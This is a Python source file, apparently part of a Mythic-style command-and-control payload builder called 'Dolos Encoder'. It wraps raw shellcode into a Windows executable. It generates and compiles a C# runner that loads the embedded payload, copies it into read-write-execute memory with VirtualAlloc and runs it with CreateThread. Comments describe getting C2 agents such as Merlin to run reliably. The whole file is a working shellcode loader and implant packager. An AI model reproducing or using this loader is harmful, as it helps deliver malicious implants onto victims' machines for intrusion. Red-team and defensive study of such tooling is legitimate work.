#!/usr/bin/env python3
"""
Dolos Encoder v2.4 — shellcode-to-EXE via C# + csc.exe + embedded resources

Creates a standalone x64 Windows PE executable from raw shellcode by:
  1. Writing the shellcode to a .resources file (via a small resgen helper)
  2. Compiling a C# VirtualAlloc runner that loads the payload from the
     embedded resource at runtime, using CreateThread to run the shellcode
     in a native thread (no CLR-managed delegate transition)
  3. csc.exe embeds the .resources file into the assembly — no metadata
     heap limits, no string literal size limits

If the input is already a PE executable (MZ header), it is passed through
unchanged.

v2.3: Replaced delegate invocation with CreateThread. The delegate approach
      (GetDelegateForFunctionPointer + StdCall) caused CLR-managed transitions
      that interfered with Go-compiled shellcode (Merlin) and some other agents.
      CreateThread runs shellcode in a native thread with no CLR interference.

v2.2: Uses embedded .resources instead of base64 string literals to avoid
      csc.exe CS0013 ("No logical space left to create more user strings")
      and CS1647 ("expression too long") on large payloads (>1MB shellcode).

Usage: encoder.py <input_path> <output_path>

Output format (stdout, parseable by Dolos builder):
  ENCODING_SUCCESS:<input_size>:<output_size>:<type_info>
  ENCODING_FAILED:<reason>

All output is logged with UTC timestamps in Mythic-compatible format.
"""

import sys
import os
import subprocess
import struct
import shutil
from datetime import datetime, timezone

# ── Configuration ──

CSC_X64 = r"C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe"
CSC_X86 = r"C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe"

# ── Logging ──


def log(level, msg):
    """Log with UTC timestamp in Mythic-compatible format.

    Levels: [*] info, [+] success, [-] warning, [!] error
    """
    ts = datetime.now(timezone.utc).strftime("%Y-%m-%dT%H:%M:%SZ")
    prefix = {
        "info": "*",
        "success": "+",
        "warning": "-",
        "error": "!",
    }.get(level, "*")
    print("[{}] [{}] {}".format(ts, prefix, msg), flush=True)


# ── Type detection ──


def is_pe(data):
    """Check if data starts with an MZ header (PE executable)."""
    return len(data) >= 2 and data[:2] == b"MZ"


def detect_type(data):
    """Detect file type from magic bytes."""
    if len(data) < 2:
        return "empty"
    if data[:2] == b"MZ":
        return "PE/EXE"
    if data[:2] == b"PK":
        return "ZIP"
    if len(data) >= 4 and data[:4] == b"\x7fELF":
        return "ELF"
    if len(data) >= 4:
        return "shellcode(0x{})".format(data[:4].hex())
    return "shellcode(0x{})".format(data[:2].hex())


def detect_arch(data):
    """Detect architecture from a PE executable. Returns 'AMD64', 'i386', or 'unknown'.

    For .NET assemblies compiled with /platform:x64, the native stub has machine=0x8664.
    For AnyCPU assemblies, the native stub has machine=0x14C (i386) but runs as 64-bit
    on 64-bit Windows. We trust the machine field — it's accurate for our csc.exe output.
    """
    if not is_pe(data) or len(data) < 0x44:
        return "unknown"
    try:
        pe_offset = struct.unpack_from("<I", data, 0x3C)[0]
        if pe_offset + 6 > len(data):
            return "unknown"
        machine = struct.unpack_from("<H", data, pe_offset + 4)[0]
        if machine == 0x8664:
            return "AMD64"
        if machine == 0x14C:
            return "i386"
        return "0x{:04X}".format(machine)
    except Exception:
        return "unknown"


# ── Resource generator (compiled once, reused) ──

# Small C# helper that creates a .resources file from a .bin file.
# This avoids csc.exe's metadata heap limit by building the resource separately.
RESGEN_CS = r"""using System;
using System.IO;
using System.Resources;

class ResGen
{
    static int Main(string[] args)
    {
        if (args.Length < 2)
        {
            Console.Error.WriteLine("Usage: resgen.exe <input.bin> <output.resources>");
            return 1;
        }
        byte[] data = File.ReadAllBytes(args[0]);
        using (ResourceWriter rw = new ResourceWriter(args[1]))
        {
            rw.AddResource("payload", data);
        }
        Console.WriteLine("Created " + args[1] + " (" + data.Length + " bytes payload)");
        return 0;
    }
}
"""

# Path to the resgen helper (compiled once, reused across builds)
RESGEN_EXE = r"C:\tools\resgen.exe"
RESGEN_CS_PATH = r"C:\tools\resgen.cs"


def ensure_resgen():
    """Ensure the resgen.exe helper is compiled. Returns True on success."""
    if os.path.isfile(RESGEN_EXE):
        return True

    log("info", "Building resgen.exe helper (one-time setup)...")

    # Write the resgen.cs source
    try:
        with open(RESGEN_CS_PATH, "w", encoding="utf-8") as f:
            f.write(RESGEN_CS)
    except Exception as e:
        log("error", "Failed to write resgen.cs: {}".format(e))
        return False

    # Compile resgen.exe
    cmd = [CSC_X64, "/nologo", "/platform:x64", "/out:" + RESGEN_EXE, RESGEN_CS_PATH]
    try:
        result = subprocess.run(cmd, capture_output=True, timeout=60)
        if result.returncode != 0:
            stdout = result.stdout.decode("utf-8", "replace").strip()
            stderr = result.stderr.decode("utf-8", "replace").strip()
            log("error", "resgen compilation failed: {} {}".format(stdout, stderr))
            return False
    except Exception as e:
        log("error", "resgen compilation error: {}".format(e))
        return False

    if not os.path.isfile(RESGEN_EXE):
        log("error", "resgen.exe not created")
        return False

    log("info", "resgen.exe built successfully")
    return True


# ── C# runner template (loads payload from embedded .resources) ──

# The runner:
# 1. Loads the embedded .resources file ("payload.resources")
# 2. Extracts the "payload" byte[] from it
# 3. VirtualAllocates RWX memory
# 4. Marshals the byte array into the allocated memory
# 5. Creates a native thread (CreateThread) and waits for it
# 6. On VirtualAlloc failure, ExitProcess(1)
#
# v2.3: Replaced delegate invocation with CreateThread. The delegate approach
# (GetDelegateForFunctionPointer) uses a CLR-managed transition that interferes
# with some shellcode (notably Go-compiled agents like Merlin). CreateThread
# runs the shellcode in a native thread with no CLR interference.
#
# v2.4: Replaced ResourceManager with GetManifestResourceStream + ResourceReader.
# ResourceManager.GetObject does a culture-aware lookup that fails with
# MissingManifestResourceException when the assembly name doesn't match the
# resource namespace. GetManifestResourceStream + ResourceReader bypasses
# culture lookup entirely and works regardless of assembly name.
#
# Compatible with csc.exe (.NET Framework 4 / C# 5).
# The .resources file is embedded via csc.exe /resource: flag at compile time.
RUNNER_CS = r"""using System;
using System.Resources;
using System.Reflection;
using System.Runtime.InteropServices;

class R
{
    [DllImport("kernel32.dll", SetLastError = true)]
    static extern IntPtr VirtualAlloc(IntPtr lpAddress, UIntPtr dwSize, uint flAllocationType, uint flProtect);

    [DllImport("kernel32.dll", SetLastError = true)]
    static extern bool VirtualFree(IntPtr lpAddress, UIntPtr dwSize, uint dwFreeType);

    [DllImport("kernel32.dll", SetLastError = true)]
    static extern IntPtr CreateThread(IntPtr lpThreadAttributes, UIntPtr dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, out uint lpThreadId);

    [DllImport("kernel32.dll", SetLastError = true)]
    static extern uint WaitForSingleObject(IntPtr hHandle, uint dwMilliseconds);

    [DllImport("kernel32.dll", SetLastError = true)]
    static extern bool CloseHandle(IntPtr hObject);

    [DllImport("kernel32.dll")]
    static extern void ExitProcess(uint uExitCode);

    const uint MEM_COMMIT = 0x1000;
    const uint MEM_RESERVE = 0x2000;
    const uint PAGE_EXECUTE_READWRITE = 0x40;
    const uint MEM_RELEASE = 0x8000;
    const uint INFINITE = 0xFFFFFFFF;

    static int Main()
    {
        // Load payload from embedded .resources using manifest stream.
        // This bypasses ResourceManager's culture-aware lookup which can fail.
        Assembly asm = Assembly.GetExecutingAssembly();
        string resName = null;
        string[] names = asm.GetManifestResourceNames();
        for (int i = 0; i < names.Length; i++)
        {
            if (names[i].EndsWith(".resources"))
            {
                resName = names[i];
                break;
            }
        }
        if (resName == null)
        {
            ExitProcess(3);
        }
        byte[] b;
        using (System.IO.Stream stream = asm.GetManifestResourceStream(resName))
        using (ResourceReader reader = new ResourceReader(stream))
        {
            b = null;
            foreach (System.Collections.DictionaryEntry entry in reader)
            {
                if ((string)entry.Key == "payload")
                {
                    b = (byte[])entry.Value;
                    break;
                }
            }
            if (b == null)
            {
                ExitProcess(4);
            }
        }
        IntPtr m = VirtualAlloc(IntPtr.Zero, (UIntPtr)b.Length, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
        if (m == IntPtr.Zero)
        {
            ExitProcess(1);
        }
        Marshal.Copy(b, 0, m, b.Length);
        uint tid;
        IntPtr t = CreateThread(IntPtr.Zero, UIntPtr.Zero, m, IntPtr.Zero, 0, out tid);
        if (t == IntPtr.Zero)
        {
            ExitProcess(2);
        }
        WaitForSingleObject(t, INFINITE);
        CloseHandle(t);
        VirtualFree(m, UIntPtr.Zero, MEM_RELEASE);
        return 0;
    }
}
"""


def generate_runner_cs():
    """Return the C# runner source code (v2.4 — GetManifestResourceStream approach)."""
    return RUNNER_CS


# ── Compilation ──


def find_csc(platform="x64"):
    """Find csc.exe for the target platform. Returns path or None."""
    if platform == "x64" or platform == "AMD64":
        if os.path.isfile(CSC_X64):
            return CSC_X64
    if os.path.isfile(CSC_X86):
        return CSC_X86
    return None


def run_cmd(cmd, timeout=300):
    """Run a command and return (success, stdout, stderr)."""
    try:
        result = subprocess.run(cmd, capture_output=True, timeout=timeout)
        stdout = result.stdout.decode("utf-8", "replace").strip()
        stderr = result.stderr.decode("utf-8", "replace").strip()
        return result.returncode == 0, stdout, stderr
    except subprocess.TimeoutExpired:
        return False, "", "Command timed out after {} seconds".format(timeout)
    except Exception as e:
        return False, "", "Command execution failed: {}".format(e)


def compile_runner(cs_path, resources_path, output_path, platform="x64"):
    """Compile the C# runner with an embedded .resources file.

    Returns (success, stdout, stderr).
    """
    csc = find_csc(platform)
    if not csc:
        return False, "", "csc.exe not found at {} or {}".format(CSC_X64, CSC_X86)

    csc_platform = "x64" if platform in ("x64", "AMD64") else "x86"

    cmd = [
        csc,
        "/nologo",
        "/platform:{}".format(csc_platform),
        "/optimize",
        "/target:winexe",
        "/resource:{}".format(resources_path),
        "/out:{}".format(output_path),
        cs_path,
    ]

    log("info", "Compiling: {}".format(" ".join(cmd)))
    return run_cmd(cmd, timeout=300)


# ── Main ──


def main():
    log("info", "Dolos Encoder v2.4")

    if len(sys.argv) < 3:
        log("error", "Usage: encoder.py <input_path> <output_path>")
        print("ENCODING_FAILED:Usage: encoder.py <input_path> <output_path>")
        sys.exit(1)

    input_path = sys.argv[1]
    output_path = sys.argv[2]

    # ── Read input ──

    if not os.path.exists(input_path):
        log("error", "Input file not found: {}".format(input_path))
        print("ENCODING_FAILED:Input file not found: {}".format(input_path))
        sys.exit(1)

    input_data = open(input_path, "rb").read()
    input_size = len(input_data)
    input_type = detect_type(input_data)

    log("info", "Input: {} ({} bytes, type: {})".format(input_path, input_size, input_type))

    if input_size == 0:
        log("error", "Input file is empty")
        print("ENCODING_FAILED:Input file is empty")
        sys.exit(1)

    # ── PE pass-through ──

    if is_pe(input_data):
        log("info", "PE/EXE detected — passing through as-is")
        arch = detect_arch(input_data)
        try:
            shutil.copy2(input_path, output_path)
        except Exception:
            with open(output_path, "wb") as f:
                f.write(input_data)
        output_size = os.path.getsize(output_path)
        log("success", "Copied {} bytes ({})".format(output_size, arch))
        log("success", "ENCODING_SUCCESS:{}:{}:{}->pass-through".format(input_size, output_size, arch))
        sys.exit(0)

    # ── Shellcode → .resources → embedded EXE ──

    # Step 1: Ensure resgen.exe helper exists
    if not ensure_resgen():
        print("ENCODING_FAILED:Failed to build resgen.exe helper")
        sys.exit(1)

    # Step 2: Create .resources file from the shellcode
    output_dir = os.path.dirname(output_path) or "."
    resources_path = os.path.join(output_dir, "payload.resources")

    log("info", "Creating .resources file from shellcode...")
    success, stdout, stderr = run_cmd(
        [RESGEN_EXE, input_path, resources_path],
        timeout=120,
    )
    if not success:
        log("error", "resgen failed: {} {}".format(stdout, stderr))
        print("ENCODING_FAILED:resgen failed: {} {}".format(stdout, stderr))
        sys.exit(1)
    if stdout:
        log("info", "resgen: {}".format(stdout))

    if not os.path.isfile(resources_path):
        log("error", ".resources file not created")
        print("ENCODING_FAILED:.resources file not created")
        sys.exit(1)

    resources_size = os.path.getsize(resources_path)
    log("info", ".resources file: {} bytes".format(resources_size))

    # Step 3: Write the C# runner source
    cs_path = os.path.join(output_dir, "runner.cs")
    try:
        with open(cs_path, "w", encoding="utf-8") as f:
            f.write(generate_runner_cs())
    except Exception as e:
        log("error", "Failed to write runner.cs: {}".format(e))
        print("ENCODING_FAILED:Failed to write runner.cs: {}".format(e))
        _cleanup([resources_path])
        sys.exit(1)

    log("info", "Wrote C# runner: {}".format(cs_path))

    # Step 4: Compile the runner with the embedded resource
    log("info", "Compiling runner with embedded resource...")
    success, stdout, stderr = compile_runner(cs_path, resources_path, output_path, platform="x64")

    # Clean up temp files
    _cleanup([cs_path, resources_path])

    if not success:
        log("error", "Compilation failed")
        if stdout:
            log("error", "csc stdout: {}".format(stdout))
        if stderr:
            log("error", "csc stderr: {}".format(stderr))
        print("ENCODING_FAILED:csc.exe compilation failed: {} {}".format(stdout, stderr))
        sys.exit(1)

    if stdout:
        log("info", "csc stdout: {}".format(stdout))

    # ── Verify output ──

    if not os.path.exists(output_path):
        log("error", "Output file not created: {}".format(output_path))
        print("ENCODING_FAILED:Output file not created by csc.exe")
        sys.exit(1)

    output_size = os.path.getsize(output_path)

    with open(output_path, "rb") as f:
        header = f.read(2)

    if header != b"MZ":
        log("error", "Output is not a valid PE (expected MZ header)")
        print("ENCODING_FAILED:Output is not a valid PE executable")
        sys.exit(1)

    # ── Success ──

    with open(output_path, "rb") as f:
        arch = detect_arch(f.read(0x100))
    if arch == "unknown":
        arch = "AMD64"
        log("info", "PE arch detection returned unknown — defaulting to AMD64 (compiled /platform:x64)")

    log("success", "Output: {} ({} bytes, {})".format(output_path, output_size, arch))
    log(
        "success",
        "ENCODING_SUCCESS:{}:{}:{}->{}".format(input_size, output_size, input_type, arch),
    )


def _cleanup(paths):
    """Delete temporary files, ignoring errors."""
    for path in paths:
        try:
            if os.path.exists(path):
                os.remove(path)
        except Exception:
            pass


if __name__ == "__main__":
    main()